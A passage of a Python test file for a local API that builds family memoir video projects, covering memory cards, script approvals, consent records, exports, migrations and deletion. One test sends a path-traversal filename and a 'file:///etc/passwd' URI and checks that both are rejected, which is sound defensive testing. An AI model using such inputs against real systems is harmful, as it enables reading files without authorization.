            "asset_id": asset["id"],
            "title": "在杭州的全家福",
            "description": "我和妻子带着女儿第一次去杭州。",
            "ocr_text": "一九八零年春天",
            "spoken_context": "照片里左边是我的妻子，前面是女儿。",
            "approximate_date": "1980年春天",
            "place": "杭州西湖",
            "people": [
                {"name": "妻子", "relationship": "配偶"},
                {"name": "女儿", "relationship": "女儿"},
            ],
            "story_relevance": "可以作为第二集家庭旅行的素材。",
            "allowed_use": "story_development",
        },
    )
    assert created.status_code == 201
    assert created.json()["confirmation_status"] == "draft"
    assert created.json()["asset_id"] == asset["id"]
    assert (
        api.get(
            f"/v1/projects/{project['id']}/memory-cards",
            params={"confirmed_only": True},
        ).json()
        == []
    )

    corrected = api.patch(
        f"/v1/memory-cards/{created.json()['id']}",
        json={
            "place": "杭州灵隐寺",
            "source_channel": "voice",
            "change_summary": "用户说地点不是西湖，是灵隐寺",
        },
    )
    assert corrected.status_code == 200
    assert corrected.json()["current_revision"] == 2
    assert corrected.json()["confirmation_status"] == "draft"
    revisions = api.get(f"/v1/memory-cards/{created.json()['id']}/revisions").json()
    assert [revision["revision"] for revision in revisions] == [1, 2]
    assert revisions[1]["source_channel"] == "voice"
    assert revisions[1]["content"]["place"] == "杭州灵隐寺"

    confirmed = api.post(
        f"/v1/memory-cards/{created.json()['id']}/confirm",
        json={
            "confirmed_by": "本人",
            "reviewed_revision": 2,
            "review_channel": "voice_and_visual",
            "spoken_confirmation": "我确认这张记忆卡并归档",
        },
    )
    assert confirmed.status_code == 200
    assert confirmed.json()["confirmation_status"] == "confirmed"
    authoritative = api.get(
        f"/v1/projects/{project['id']}/memory-cards",
        params={"confirmed_only": True},
    ).json()
    assert authoritative[0]["place"] == "杭州灵隐寺"
    assert authoritative[0]["people"][0]["relationship"] == "配偶"
    confirmations = api.get(f"/v1/memory-cards/{created.json()['id']}/confirmations").json()
    assert confirmations[0]["reviewed_revision"] == 2
    assert confirmations[0]["spoken_confirmation"] == "我确认这张记忆卡并归档"

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert backup["schema_version"] == "nalu.project-export/v19"
    assert backup["payload"]["memory_cards"][0]["asset_id"] == asset["id"]

    other = api.post("/v1/projects", json={"title": "另一个项目"}).json()
    cross_project = api.post(
        f"/v1/projects/{other['id']}/memory-cards",
        json={"asset_id": asset["id"], "title": "错误关联"},
    )
    assert cross_project.status_code == 409


def test_archive_audio_and_video_import_as_reference_without_generation_consent(
    tmp_path: Path,
) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects", json={"title": "家庭档案", "audience_mode": "older_adult"}
    ).json()
    for kind, filename, content_type in (
        ("archive_audio", "口述回忆.m4a", "audio/mp4"),
        ("archive_video", "家庭录像.mov", "video/quicktime"),
    ):
        imported = api.post(
            f"/v1/projects/{project['id']}/asset-imports",
            params={"filename": filename, "kind": kind, "name": filename},
            content=b"local family archive",
            headers={"Content-Type": content_type},
        )
        assert imported.status_code == 201
        assert imported.json()["consent_granted"] is False

        card = api.post(
            f"/v1/projects/{project['id']}/memory-cards",
            json={
                "asset_id": imported.json()["id"],
                "title": filename,
                "allowed_use": "reference_only",
            },
        )
        assert card.status_code == 201
        assert card.json()["confirmation_status"] == "draft"


def test_script_history_stale_approval_and_revocation(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post("/v1/projects", json={"title": "剧本版本"}).json()
    season = api.post(
        f"/v1/projects/{project['id']}/seasons",
        json={"title": "第一季", "season_number": 1},
    ).json()
    episode = api.post(
        f"/v1/seasons/{season['id']}/episodes",
        json={"title": "第一集", "episode_number": 1},
    ).json()
    first = api.post(
        f"/v1/episodes/{episode['id']}/scripts",
        json={"content": "第一版", "summary_for_voice_review": "第一版摘要"},
    ).json()
    second = api.post(
        f"/v1/episodes/{episode['id']}/scripts",
        json={"content": "第二版", "summary_for_voice_review": "第二版摘要"},
    ).json()
    history = api.get(f"/v1/episodes/{episode['id']}/scripts").json()
    assert [script["revision"] for script in history] == [1, 2]
    assert history[0]["content"] == "第一版"

    stale = api.post(
        f"/v1/episodes/{episode['id']}/scripts/{first['revision']}/approve",
        json={"approved_by": "user", "spoken_confirmation": "误选旧版"},
    )
    assert stale.status_code == 409
    approved = api.post(
        f"/v1/episodes/{episode['id']}/scripts/{second['revision']}/approve",
        json={"approved_by": "user", "spoken_confirmation": "我确认第二版"},
    )
    assert approved.status_code == 200

    revoked = api.post(
        f"/v1/episodes/{episode['id']}/scripts/{second['revision']}/revoke",
        json={"requested_by": "user", "reason": "发现人物年龄有误"},
    )
    assert revoked.status_code == 200
    assert revoked.json()["approved_at"] is None
    stored = api.get(f"/v1/episodes/{episode['id']}").json()
    assert stored["status"] == "script_review"
    assert stored["approved_script_revision"] is None
    records = api.get(f"/v1/episodes/{episode['id']}/script-approvals").json()
    assert [record["action_type"] for record in records] == [
        "script_approved",
        "script_revoked",
    ]
    blocked = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "revoked-script"},
    )
    assert blocked.status_code == 409


def test_atomic_multi_episode_project_plan(tmp_path: Path) -> None:
    api = client(tmp_path)
    response = api.post(
        "/v1/project-plans",
        json={
            "project": {
                "title": "十集自传",
                "audience_mode": "older_adult",
                "planned_episode_count": 10,
            },
            "season_title": "人生第一季",
        },
    )
    assert response.status_code == 201
    plan = response.json()
    assert plan["season"]["project_id"] == plan["project"]["id"]
    assert [row["episode_number"] for row in plan["episodes"]] == list(range(1, 11))

    rejected = api.post(
        "/v1/project-plans",
        json={
            "project": {"title": "不完整计划", "planned_episode_count": 3},
            "episode_titles": ["只有一集"],
        },
    )
    assert rejected.status_code == 409
    projects = api.get("/v1/projects").json()
    assert [project["title"] for project in projects] == ["十集自传"]


def test_draft_project_is_finalized_in_place_with_existing_assets(tmp_path: Path) -> None:
    api = client(tmp_path)
    draft = api.post(
        "/v1/projects",
        json={"title": "未命名故事", "description": "语音采访进行中"},
    ).json()
    imported = api.post(
        f"/v1/projects/{draft['id']}/asset-imports",
        params={
            "filename": "memory.jpg",
            "kind": "scene_reference",
            "name": "老照片",
        },
        content=b"memory",
        headers={"Content-Type": "image/jpeg"},
    )
    assert imported.status_code == 201

    finalized = api.post(
        "/v1/project-plans",
        json={
            "project_id": draft["id"],
            "project": {
                "title": "外婆的夏天",
                "description": "外婆讲年轻时的故事",
                "audience_mode": "older_adult",
                "planned_episode_count": 3,
            },
        },
    )
    assert finalized.status_code == 201
    assert finalized.json()["project"]["id"] == draft["id"]
    assert finalized.json()["project"]["title"] == "外婆的夏天"
    assert len(finalized.json()["episodes"]) == 3
    assets = api.get(f"/v1/projects/{draft['id']}/assets").json()
    assert [asset["name"] for asset in assets] == ["老照片"]

    repeated = api.post(
        "/v1/project-plans",
        json={
            "project_id": draft["id"],
            "project": {"title": "重复", "planned_episode_count": 1},
        },
    )
    assert repeated.status_code == 409


def test_season_plan_revisions_approval_and_episode_immutability(tmp_path: Path) -> None:
    api = client(tmp_path)
    plan = api.post(
        "/v1/project-plans",
        json={"project": {"title": "三代人的家", "planned_episode_count": 3}},
    ).json()
    season_id = plan["season"]["id"]
    first, second, third = plan["episodes"]

    changed = api.patch(
        f"/v1/episodes/{second['id']}",
        json={
            "logline": "母亲讲述搬进新城的第一晚",
            "outline": {"turn": "一家人在停电中重新靠近"},
            "source_transcript": "第二集讲妈妈搬家的故事",
        },
    )
    assert changed.status_code == 200
    assert changed.json()["outline"]["turn"] == "一家人在停电中重新靠近"
    season = api.patch(
        f"/v1/seasons/{season_id}",
        json={
            "season_arc": {"theme": "三代人如何成为一家人"},
            "source_transcript": "这一季从分离讲到团聚",
        },
    ).json()
    approval = api.post(
        f"/v1/seasons/{season_id}/plan-approvals",
        json={
            "approved_by": "user",
            "spoken_confirmation": "我看过也听过，同意这个分集计划",
            "review_channel": "voice_and_visual",
        },
    )
    assert approval.status_code == 201
    assert approval.json()["plan_revision"] == season["plan_revision"]

    script = api.post(
        f"/v1/episodes/{first['id']}/scripts",
        json={"content": "锁定的第一集", "summary_for_voice_review": "第一集摘要"},
    ).json()
    api.post(
        f"/v1/episodes/{first['id']}/scripts/{script['revision']}/approve",
        json={"approved_by": "user", "spoken_confirmation": "确认第一集"},
    )
    locked_before = api.get(f"/v1/episodes/{first['id']}").json()
    rejected = api.patch(f"/v1/episodes/{first['id']}", json={"title": "不允许覆盖的标题"})
    assert rejected.status_code == 409

    assert api.patch(f"/v1/episodes/{third['id']}", json={"title": "未来的团圆"}).status_code == 200
    assert api.get(f"/v1/episodes/{first['id']}").json() == locked_before
    latest_season = api.get(f"/v1/projects/{plan['project']['id']}/seasons").json()[0]
    assert latest_season["plan_revision"] > latest_season["approved_plan_revision"]
    revisions = api.get(f"/v1/seasons/{season_id}/plan-revisions").json()
    assert revisions[-1]["plan"]["episodes"][2]["title"] == "未来的团圆"


def test_concurrent_episode_planning_has_stable_numbering(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post("/v1/projects", json={"title": "并发分集"}).json()
    season = api.post(
        f"/v1/projects/{project['id']}/seasons",
        json={"title": "第一季", "season_number": 1, "planned_episode_count": 10},
    ).json()

    def create_episode(number: int):
        return api.post(
            f"/v1/seasons/{season['id']}/episodes",
            json={"title": f"第{number}集", "episode_number": number},
        )

    with ThreadPoolExecutor(max_workers=10) as pool:
        responses = list(pool.map(create_episode, range(1, 11)))
    assert {response.status_code for response in responses} == {201}
    episodes = api.get(f"/v1/seasons/{season['id']}/episodes").json()
    assert [episode["episode_number"] for episode in episodes] == list(range(1, 11))
    assert len({episode["id"] for episode in episodes}) == 10


def test_each_episode_has_independent_production_progress(tmp_path: Path) -> None:
    api = client(tmp_path)
    plan = api.post(
        "/v1/project-plans",
        json={"project": {"title": "三集进度", "planned_episode_count": 3}},
    ).json()
    season_id = plan["season"]["id"]
    first = plan["episodes"][0]
    initial = api.get(f"/v1/seasons/{season_id}/production-progress").json()
    assert [item["progress_percent"] for item in initial] == [0, 0, 0]
    assert len({item["episode_id"] for item in initial}) == 3

    script = api.post(
        f"/v1/episodes/{first['id']}/scripts",
        json={"content": "第一集剧本", "summary_for_voice_review": "第一集摘要"},
    ).json()
    api.post(
        f"/v1/episodes/{first['id']}/scripts/{script['revision']}/approve",
        json={"approved_by": "user", "spoken_confirmation": "我确认第一集"},
    )
    ready = api.get(f"/v1/episodes/{first['id']}/production-progress").json()
    assert ready["progress_percent"] == 20
    assert ready["current_action"] == "可以进入制作"

    run = api.post(
        f"/v1/episodes/{first['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "progress-run"},
    ).json()
    progress = api.get(f"/v1/seasons/{season_id}/production-progress").json()
    assert [item["progress_percent"] for item in progress] == [30, 0, 0]
    assert progress[0]["run_id"] == run["id"]
    assert progress[0]["can_cancel"] is True

    api.post(
        f"/v1/production-runs/{run['id']}/cancel",
        json={"requested_by": "user", "reason": "稍后继续"},
    )
    cancelled = api.get(f"/v1/episodes/{first['id']}/production-progress").json()
    assert cancelled["stage"] == "cancelled"
    assert cancelled["can_resume"] is True
    assert cancelled["progress_percent"] == 30


def test_project_rename_archive_export_and_restore(tmp_path: Path) -> None:
    source = client(tmp_path / "source")
    plan = source.post(
        "/v1/project-plans",
        json={"project": {"title": "十集人生", "planned_episode_count": 10}},
    ).json()
    project_id = plan["project"]["id"]
    renamed = source.patch(f"/v1/projects/{project_id}", json={"title": "十集人生故事"})
    assert renamed.status_code == 200
    assert renamed.json()["title"] == "十集人生故事"

    archived = source.post(f"/v1/projects/{project_id}/archive", json={"archived": True})
    assert archived.json()["archived_at"] is not None
    assert source.get("/v1/projects").json() == []
    assert source.get("/v1/projects?include_archived=true").json()[0]["id"] == project_id

    backup = source.get(f"/v1/projects/{project_id}/export").json()
    target_database = tmp_path / "target" / "nalu.sqlite3"
    target_data = tmp_path / "target" / "data"
    target = TestClient(create_app(target_database, target_data))
    restored = target.post("/v1/project-imports", json=backup)
    assert restored.status_code == 201
    assert restored.json()["id"] == project_id
    seasons = target.get(f"/v1/projects/{project_id}/seasons").json()
    episodes = target.get(f"/v1/seasons/{seasons[0]['id']}/episodes").json()
    assert [episode["episode_number"] for episode in episodes] == list(range(1, 11))

    restarted = TestClient(create_app(target_database, target_data))
    assert restarted.get(f"/v1/projects/{project_id}").json()["title"] == "十集人生故事"

    tampered = deepcopy(backup)
    tampered["payload"]["projects"][0]["title"] = "被篡改"
    rejected = client(tmp_path / "tampered").post("/v1/project-imports", json=tampered)
    assert rejected.status_code == 409

    foreign = deepcopy(backup)
    foreign["payload"]["seasons"][0]["project_id"] = "prj_foreign"
    canonical = json.dumps(foreign["payload"], ensure_ascii=False, sort_keys=True)
    foreign["payload_sha256"] = hashlib.sha256(canonical.encode()).hexdigest()
    rejected = client(tmp_path / "foreign").post("/v1/project-imports", json=foreign)
    assert rejected.status_code == 409

    legacy = deepcopy(backup)
    legacy["schema_version"] = "nalu.project-export/v1"
    legacy["payload"].pop("season_plan_revisions")
    legacy["payload"].pop("season_plan_approval_records")
    legacy["payload"].pop("asset_consent_records")
    legacy["payload"].pop("feedback_items")
    legacy["payload"].pop("feedback_review_bundles")
    legacy["payload"].pop("feedback_release_linkages")
    legacy["payload"].pop("feedback_triage_records")
    legacy["payload"].pop("feedback_external_exports")
    legacy["payload"].pop("feedback_external_reconciliations")
    legacy["payload"].pop("feedback_development_work_orders")
    legacy["payload"].pop("feedback_development_handoffs")
    legacy["payload"].pop("feedback_development_handoff_reconciliations")
    legacy["payload"].pop("feedback_development_results")
    legacy["payload"].pop("feedback_release_evidence_reconciliations")
    legacy["payload"].pop("memory_cards")
    legacy["payload"].pop("memory_card_revisions")
    legacy["payload"].pop("memory_card_confirmation_records")
    legacy["payload"].pop("library_entities")
    legacy["payload"].pop("library_entity_revisions")
    legacy["payload"].pop("library_entity_confirmation_records")
    legacy["payload"].pop("continuity_extraction_confirmation_records")
    legacy["payload"]["projects"][0].pop("creative_format")
    legacy["payload"]["projects"][0].pop("production_pipeline")
    canonical = json.dumps(legacy["payload"], ensure_ascii=False, sort_keys=True)
    legacy["payload_sha256"] = hashlib.sha256(canonical.encode()).hexdigest()
    restored_legacy = client(tmp_path / "legacy").post("/v1/project-imports", json=legacy)
    assert restored_legacy.status_code == 201


def test_project_plan_idempotency_is_concurrent_and_payload_bound(tmp_path: Path) -> None:
    api = client(tmp_path)
    payload = {
        "project": {"title": "只创建一次", "planned_episode_count": 3},
        "season_title": "第一季",
    }

    def create_once(_index: int):
        return api.post(
            "/v1/project-plans",
            json=payload,
            headers={"Idempotency-Key": "voice-session-001"},
        )

    with ThreadPoolExecutor(max_workers=6) as pool:
        responses = list(pool.map(create_once, range(6)))

    assert {response.status_code for response in responses} == {201}
    assert len({response.json()["project"]["id"] for response in responses}) == 1
    assert len(api.get("/v1/projects").json()) == 1

    conflict = api.post(
        "/v1/project-plans",
        json={"project": {"title": "不同请求", "planned_episode_count": 1}},
        headers={"Idempotency-Key": "voice-session-001"},
    )
    assert conflict.status_code == 409


def test_episode_lifecycle_and_restart_recovery(tmp_path: Path) -> None:
    database_path = tmp_path / "restart.sqlite3"
    data_root = tmp_path / "data"
    first = TestClient(create_app(database_path, data_root))
    _, _, episode = create_approved_episode(first)

    lifecycle = first.get(f"/v1/episodes/{episode['id']}/events").json()
    assert [(row["from_status"], row["to_status"]) for row in lifecycle] == [
        ("planned", "script_review"),
        ("script_review", "script_approved"),
    ]
    invalid = first.post(
        f"/v1/episodes/{episode['id']}/transition",
        json={
            "target_status": "published",
            "requested_by": "test",
            "reason": "attempt to skip required gates",
        },
    )
    assert invalid.status_code == 409

    production_path = f"/v1/episodes/{episode['id']}/production-runs"
    run = first.post(
        production_path,
        json={"dry_run": True},
        headers={"Idempotency-Key": "restart-safe-run"},
    ).json()
    assert first.get(f"/v1/episodes/{episode['id']}").json()["status"] == "preproduction"

    restarted = TestClient(create_app(database_path, data_root))
    assert restarted.get(f"/v1/production-runs/{run['id']}").json()["id"] == run["id"]
    assert (
        restarted.get(f"/v1/production-runs/{run['id']}/events").json()[0]["event_type"]
        == "run_created"
    )
    assert (
        restarted.get(f"/v1/episodes/{episode['id']}/events").json()[-1]["to_status"]
        == "preproduction"
    )
    replay = restarted.post(
        production_path,
        json={"dry_run": True},
        headers={"Idempotency-Key": "restart-safe-run"},
    )
    assert replay.status_code == 201
    assert replay.json()["id"] == run["id"]


def test_database_migration_preserves_existing_database(tmp_path: Path) -> None:
    database_path = tmp_path / "legacy.sqlite3"
    with sqlite3.connect(database_path) as connection:
        connection.execute("CREATE TABLE legacy_marker (value TEXT NOT NULL)")
        connection.execute("INSERT INTO legacy_marker VALUES ('preserve-me')")

    api = create_app(database_path, tmp_path / "data")
    assert api.state.repository.db.schema_version() == 23
    with sqlite3.connect(database_path) as connection:
        marker = connection.execute("SELECT value FROM legacy_marker").fetchone()[0]
        approval_table = connection.execute(
            "SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'approval_records'"
        ).fetchone()
    assert marker == "preserve-me"
    assert approval_table == ("approval_records",)


def test_local_runtime_files_are_private_to_current_user(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    imported = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "private.txt",
            "kind": "source_document",
            "name": "私人采访",
        },
        content=b"private",
        headers={"Content-Type": "text/plain"},
    ).json()
    stored_path = Path(unquote(urlparse(imported["local_uri"]).path))
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "private-file-modes"},
    ).json()
    package_path = Path(run["package_path"])

    assert stat.S_IMODE((tmp_path / "test.sqlite3").stat().st_mode) == 0o600
    assert stat.S_IMODE((tmp_path / "data").stat().st_mode) == 0o700
    assert stat.S_IMODE(stored_path.parent.stat().st_mode) == 0o700
    assert stat.S_IMODE(stored_path.stat().st_mode) == 0o600
    assert stat.S_IMODE(package_path.parent.stat().st_mode) == 0o700
    assert stat.S_IMODE(package_path.stat().st_mode) == 0o600


def test_populated_v1_database_upgrades_without_project_loss(tmp_path: Path) -> None:
    database_path = tmp_path / "populated.sqlite3"
    data_root = tmp_path / "data"
    before = TestClient(create_app(database_path, data_root))
    project, _, episode = create_approved_episode(before)

    with sqlite3.connect(database_path) as connection:
        connection.execute("DROP TABLE episode_events")
        connection.execute("DROP TABLE idempotency_records")
        connection.execute("DROP TABLE idempotent_operations")
        connection.execute("DELETE FROM schema_migrations WHERE version >= 2")

    after = TestClient(create_app(database_path, data_root))
    assert after.app.state.repository.db.schema_version() == 23
    assert after.get(f"/v1/projects/{project['id']}").json()["title"] == "我的一生"
    assert after.get(f"/v1/episodes/{episode['id']}").json()["approved_script_revision"] == 1
    approvals = after.get(f"/v1/episodes/{episode['id']}/script-approvals").json()
    assert approvals[0]["spoken_confirmation"] == "我确认这个剧本"


def test_biometric_asset_requires_consent(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, _ = create_approved_episode(api)
    response = api.post(
        f"/v1/projects/{project['id']}/assets",
        json={
            "kind": "character_image",
            "name": "主角正面照",
            "local_uri": "file:///tmp/portrait.jpg",
            "consent_granted": False,
        },
    )
    assert response.status_code == 422


def test_local_asset_import_consent_revocation_and_path_safety(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    endpoint = f"/v1/projects/{project['id']}/asset-imports"

    traversal = api.post(
        endpoint,
        params={
            "filename": "../../portrait.jpg",
            "kind": "character_image",
            "name": "不安全文件",
            "consent_granted": True,
            "consent_granted_by": "user",
            "consent_statement": "我同意用于本项目",
        },
        content=b"fake-jpeg",
        headers={"Content-Type": "image/jpeg"},
    )
    assert traversal.status_code == 409
    legacy_escape = api.post(
        f"/v1/projects/{project['id']}/assets",
        json={
            "kind": "source_document",
            "name": "系统文件",
            "local_uri": "file:///etc/passwd",
        },
    )
    assert legacy_escape.status_code == 409

    missing_consent = api.post(
        endpoint,
        params={
            "filename": "portrait.jpg",
            "kind": "character_image",
            "name": "主角照片",
        },
        content=b"fake-jpeg",
        headers={"Content-Type": "image/jpeg"},
    )
    assert missing_consent.status_code == 409

    imported = api.post(
        endpoint,
        params={
            "filename": "portrait.jpg",
            "kind": "character_image",
            "name": "主角照片",
            "subject_name": "主人公",
            "episode_id": episode["id"],
            "consent_granted": True,
            "consent_scope": "project_only",
            "consent_granted_by": "本人",
            "consent_statement": "我同意这张照片仅用于本项目",
        },
        content=b"fake-jpeg",
        headers={"Content-Type": "image/jpeg"},
    )
    assert imported.status_code == 201
    asset = imported.json()
    stored_path = Path(unquote(urlparse(asset["local_uri"]).path)).resolve()
    assert stored_path.is_relative_to((tmp_path / "data" / "assets").resolve())
    assert stored_path.read_bytes() == b"fake-jpeg"
    records = api.get(f"/v1/assets/{asset['id']}/consent-records").json()
    assert records[0]["action_type"] == "granted"
    assert records[0]["statement"] == "我同意这张照片仅用于本项目"

    revoked = api.post(
        f"/v1/assets/{asset['id']}/consent-revocations",
        json={"requested_by": "本人", "reason": "我不再同意使用照片"},
    )
    assert revoked.status_code == 201
    assert revoked.json()["action_type"] == "revoked"
    stored_asset = api.get(f"/v1/projects/{project['id']}/assets").json()[0]
    assert stored_asset["consent_granted"] is False
    blocked = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "revoked-biometric"},
    )
    assert blocked.status_code == 409


def test_project_season_and_episode_asset_scope_inheritance(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, season, episode = create_approved_episode(api)
    endpoint = f"/v1/projects/{project['id']}/asset-imports"

    project_asset = api.post(
        endpoint,
        params={
            "filename": "bible.txt",
            "kind": "source_document",
            "name": "项目资料",
        },
        content=b"project",
        headers={"Content-Type": "text/plain"},
    )
    season_asset = api.post(
        endpoint,
        params={
            "filename": "season.jpg",
            "kind": "scene_reference",
            "name": "本季场景",
            "season_id": season["id"],
        },
        content=b"season",
        headers={"Content-Type": "image/jpeg"},
    )
    episode_asset = api.post(
        endpoint,
        params={
            "filename": "episode.jpg",
            "kind": "prop_reference",
            "name": "本集道具",
            "episode_id": episode["id"],
        },
        content=b"episode",
        headers={"Content-Type": "image/jpeg"},
    )
    assert [response.status_code for response in (project_asset, season_asset, episode_asset)] == [
        201,
        201,
        201,
    ]
    assert season_asset.json()["season_id"] == season["id"]
    assert episode_asset.json()["episode_id"] == episode["id"]

    season_assets = api.get(
        f"/v1/projects/{project['id']}/assets", params={"season_id": season["id"]}
    ).json()
    assert {asset["name"] for asset in season_assets} == {"项目资料", "本季场景"}
    episode_assets = api.get(
        f"/v1/projects/{project['id']}/assets", params={"episode_id": episode["id"]}
    ).json()
    assert {asset["name"] for asset in episode_assets} == {
        "项目资料",
        "本季场景",
        "本集道具",
    }
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "three-level-asset-scope"},
    )
    assert run.status_code == 201
    for asset in (project_asset.json(), season_asset.json(), episode_asset.json()):
        dependencies = api.get(f"/v1/assets/{asset['id']}/dependencies").json()
        assert dependencies["production_run_ids"] == [run.json()["id"]]

    ambiguous = api.post(
        endpoint,
        params={
            "filename": "ambiguous.jpg",
            "kind": "scene_reference",
            "name": "范围不明确",
            "season_id": season["id"],
            "episode_id": episode["id"],
        },
        content=b"ambiguous",
        headers={"Content-Type": "image/jpeg"},
    )
    assert ambiguous.status_code == 409

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    legacy_v3 = deepcopy(backup)
    legacy_v3["schema_version"] = "nalu.project-export/v3"
    legacy_v3["payload"].pop("feedback_items")
    legacy_v3["payload"].pop("feedback_review_bundles")
    legacy_v3["payload"].pop("feedback_release_linkages")
    legacy_v3["payload"].pop("feedback_triage_records")
    legacy_v3["payload"].pop("feedback_external_exports")
    legacy_v3["payload"].pop("feedback_external_reconciliations")
    legacy_v3["payload"].pop("feedback_development_work_orders")
    legacy_v3["payload"].pop("feedback_development_handoffs")
    legacy_v3["payload"].pop("feedback_development_handoff_reconciliations")
    legacy_v3["payload"].pop("feedback_development_results")
    legacy_v3["payload"].pop("feedback_release_evidence_reconciliations")
    legacy_v3["payload"].pop("memory_cards")
    legacy_v3["payload"].pop("memory_card_revisions")
    legacy_v3["payload"].pop("memory_card_confirmation_records")
    legacy_v3["payload"].pop("library_entities")
    legacy_v3["payload"].pop("library_entity_revisions")
    legacy_v3["payload"].pop("library_entity_confirmation_records")
    legacy_v3["payload"].pop("continuity_extraction_confirmation_records")
    legacy_v3["payload"]["projects"][0].pop("creative_format")
    legacy_v3["payload"]["projects"][0].pop("production_pipeline")
    for asset in legacy_v3["payload"]["assets"]:
        asset.pop("season_id")
    canonical = json.dumps(legacy_v3["payload"], ensure_ascii=False, sort_keys=True)
    legacy_v3["payload_sha256"] = hashlib.sha256(canonical.encode()).hexdigest()
    restored = client(tmp_path / "legacy-v3").post("/v1/project-imports", json=legacy_v3)
    assert restored.status_code == 201


def test_asset_dependency_blocks_deletion_after_snapshot(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    imported = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "room.jpg",
            "kind": "scene_reference",
            "name": "老屋",
        },
        content=b"scene-image",
        headers={"Content-Type": "image/jpeg"},
    ).json()
    api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "asset-snapshot"},
    )
    report = api.get(f"/v1/assets/{imported['id']}/dependencies").json()
    assert report["can_delete"] is False
    assert len(report["production_run_ids"]) == 1
    assert api.delete(f"/v1/assets/{imported['id']}").status_code == 409


def test_complete_privacy_export_and_confirmed_project_deletion(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, _, episode = create_approved_episode(api)
    imported = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "portrait.jpg",
            "kind": "character_image",
            "name": "本人照片",
            "consent_granted": True,
            "consent_granted_by": "本人",
            "consent_statement": "我同意仅用于这部短剧",
        },
        content=b"private-photo-bytes",
        headers={"Content-Type": "image/jpeg"},
    ).json()
    run = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "privacy-deletion-run"},
    ).json()

    exported = api.get(f"/v1/projects/{project['id']}/privacy-export")
    assert exported.status_code == 200
    with zipfile.ZipFile(io.BytesIO(exported.content)) as archive:
        names = set(archive.namelist())
        media_name = f"media/{imported['id']}/portrait.jpg"
        assert {"project-export.json", "privacy-manifest.json", media_name} <= names
        assert archive.read(media_name) == b"private-photo-bytes"
        project_backup = json.loads(archive.read("project-export.json"))
        assert project_backup["schema_version"] == "nalu.project-export/v19"
        assert project_backup["payload"]["asset_consent_records"][0]["action_type"] == "granted"
        manifest = json.loads(archive.read("privacy-manifest.json"))
        assert manifest["database_included"] is False
        assert manifest["secret_material_included"] is False

    preview = api.get(f"/v1/projects/{project['id']}/deletion-preview").json()
    assert preview["asset_count"] == 1
    assert preview["production_run_count"] == 1
    refused = api.request(
        "DELETE",
        f"/v1/projects/{project['id']}",
        json={
            "confirmation_title": project["title"],
            "requested_by": "user",
            "delete_production_snapshots": False,
        },
    )
    assert refused.status_code == 409
    assert api.get(f"/v1/projects/{project['id']}").status_code == 200

    deleted = api.request(
        "DELETE",
        f"/v1/projects/{project['id']}",
        json={
            "confirmation_title": project["title"],
            "requested_by": "user",
            "delete_production_snapshots": True,
        },
    )
    assert deleted.status_code == 200
    assert deleted.json() == {
        "project_id": project["id"],
        "deleted": True,
        "removed_asset_count": 1,
        "removed_production_run_count": 1,
        "verified_absent": True,
    }
    assert api.get(f"/v1/projects/{project['id']}").status_code == 404
    assert not (tmp_path / "data" / "assets" / project["id"]).exists()
    assert not (tmp_path / "data" / "runs" / run["id"]).exists()
    assert list((tmp_path / "data" / "privacy-exports").glob(f"{project['id']}-*")) == []


def test_production_requires_approved_script(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post("/v1/projects", json={"title": "测试项目"}).json()
    season = api.post(
        f"/v1/projects/{project['id']}/seasons",
        json={"title": "第一季", "season_number": 1},
    ).json()
    episode = api.post(
        f"/v1/seasons/{season['id']}/episodes",
        json={"title": "第一集", "episode_number": 1},
    ).json()
    response = api.post(f"/v1/episodes/{episode['id']}/production-runs", json={"dry_run": True})
    assert response.status_code == 409


def test_dry_run_writes_immutable_package(tmp_path: Path) -> None:
    api = client(tmp_path)
    _, _, episode = create_approved_episode(api)
    response = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True, "requested_model": "seedance-2.0-pro"},
    )
    assert response.status_code == 201
    run = response.json()
    assert run["status"] == "preflight"
    package = Path(run["package_path"])
    assert package.exists()
    assert "package_sha256" in package.read_text(encoding="utf-8")
    assert package.with_name("qingshan-preflight-report.json").exists()
    workspace = package.with_name("qingshan-workspace")
    assert (workspace / "workspace-manifest.json").exists()
    assert (workspace / "source" / "E01_APPROVED_SCRIPT.md").exists()
    assert (workspace / "workflow" / "work_queue.json").exists()
    task = json.loads(
        (workspace / "workflow" / "tasks" / "E01_PRODUCTION_TASK.json").read_text(encoding="utf-8")
    )
    output_contract = task["required_outputs"]["shot_boundary_manifest"]
    assert output_contract["artifact_kind"] == "shot_manifest"
    assert output_contract["relative_path"] == "exports/E01_SHOT_BOUNDARIES.json"
    shot_contract = json.loads(
        (workspace / output_contract["contract_path"]).read_text(encoding="utf-8")
    )
    assert shot_contract["schema_version"] == "nalu.shot-boundary-output-contract/v1"
    assert (
        shot_contract["production_package_sha256"]
        == json.loads(package.read_text(encoding="utf-8"))["package_sha256"]
    )
    assert shot_contract["fail_closed"] is True
